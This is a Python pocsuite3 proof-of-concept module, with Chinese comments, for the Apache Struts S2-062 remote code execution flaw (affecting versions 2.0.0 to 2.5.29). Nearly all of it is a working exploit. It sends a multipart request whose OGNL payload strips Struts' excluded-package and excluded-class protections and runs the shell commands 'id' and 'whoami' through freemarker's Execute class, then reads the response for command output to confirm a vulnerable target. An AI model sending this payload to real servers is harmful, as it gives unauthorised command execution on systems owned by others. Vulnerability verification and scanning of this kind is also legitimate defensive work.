from pocsuite3.api import (
    Output,
    POCBase,
    POC_CATEGORY,
    register_poc,
    requests,
    VUL_TYPE,

)


class Canal(POCBase):
    # fofa语句: app="apollo"
    vulID = "0"  # ssvid ID 如果是提交漏洞的同时提交 PoC,则写成 0
    version = "1"  # 默认为1
    author = "derian"  # PoC作者的大名
    vulDate = "2022-04-20"  # 漏洞公开的时间,不知道就写今天
    createDate = "2022-04-20"  # 编写 PoC 的日期
    updateDate = "2021-04-20"  # PoC 更新的时间,默认和编写时间一样
    references = ["https://github.com/YanMu2020/s2-062"]  # 漏洞地址来源,0day不用写
    name = "Apache Struct s2-062-rce"  # PoC 名称
    appPowerLink = "https://struts.apache.org/"  # 漏洞厂商主页地址
    appName = "Apache Struct"  # 漏洞应用名称
    appVersion = "Apache Struts 2.0.0-2.5.29"  # 漏洞影响版本
    vulType = VUL_TYPE.COMMAND_EXECUTION  # 命令执行 漏洞类型,类型参考见 漏洞类型规范表
    category = POC_CATEGORY.EXPLOITS.WEBAPP  # poc对应的产品类型 web的
    # samples = []  # 测试样列,就是用 PoC 测试成功的网站
    # install_requires = []  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    desc = """本次漏洞是对`CVE-2020-17530`修复之后的绕过，当使用语法`%{...}`应用强制`OGNL`解析，某些`tag`标签的属性仍然可以被二次解析。"""  # 漏洞简要描述
    pocDesc = """------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'whoami'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94"""  # POC用法描述

    def _check(self):
        result = []
        url = self.url.strip()
        try:
            headers = {"Cache-Control": "max-age=0", "Upgrade-Insecure-Requests": "1",
                       "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36",
                       "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
                       "Accept-Encoding": "gzip, deflate", "Accept-Language": "zh-CN,zh;q=0.9,en;q=0.8",
                       "Connection": "close",
                       "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryl7d1B1aGsV2wcZwF"}
            data = "------WebKitFormBoundaryl7d1B1aGsV2wcZwF\r\nContent-Disposition: form-data; name=\"id\"\r\n\r\n%{\r\n(#request.map=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map.setBean(#request.get('struts.valueStack')) == true).toString().substring(0,0) +\r\n(#request.map2=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map2.setBean(#request.get('map').get('context')) == true).toString().substring(0,0) +\r\n(#request.map3=#@org.apache.commons.collections.BeanMap@{}).toString().substring(0,0) +\r\n(#request.map3.setBean(#request.get('map2').get('memberAccess')) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedPackageNames',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#request.get('map3').put('excludedClasses',#@org.apache.commons.collections.BeanMap@{}.keySet()) == true).toString().substring(0,0) +\r\n(#application.get('org.apache.tomcat.InstanceManager').newInstance('freemarker.template.utility.Execute').exec({'id'}))\r\n}\r\n------WebKitFormBoundaryl7d1B1aGsV2wcZwF\xe2\x80\x94"
            response = requests.post(url, headers=headers, data=data, verify=False, timeout=5,
                                     allow_redirects=False)
            text = response.text
            if "uid=" in text and "gid=" in text and "groups=" in text:
                result.append(url)
                return result
        except Exception as e:
            print(e)
        finally:
            return result

    def _verify(self):
        result = {}
        res = self._check()  # res就是返回的结果列表
        if res:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['Info'] = self.name
            result['VerifyInfo']['vul_url'] = self.url
            result['VerifyInfo']['vul_detail'] = self.pocDesc
        return self.parse_verify(result)

    def _attack(self):
        return self._verify()

    def parse_verify(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('Target is not vulnerable')
        return output


def other_fuc():
    pass


def other_utils_func():
    pass


# 注册 DemoPOC 类
register_poc(Canal)
